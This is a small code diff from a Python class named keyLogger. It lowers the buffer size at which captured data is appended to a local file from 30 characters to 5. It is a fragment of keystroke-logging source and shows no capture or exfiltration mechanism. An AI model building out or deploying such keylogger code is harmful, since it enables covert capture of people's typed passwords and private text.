@@ -20,7 +20,7 @@ class keyLogger:
         self.local()
 
     def local(self):
-        if len(self.data)>30:
+        if len(self.data)>5:
             fp=open(self.path,"a")
             fp.write(self.data)
             fp.close()
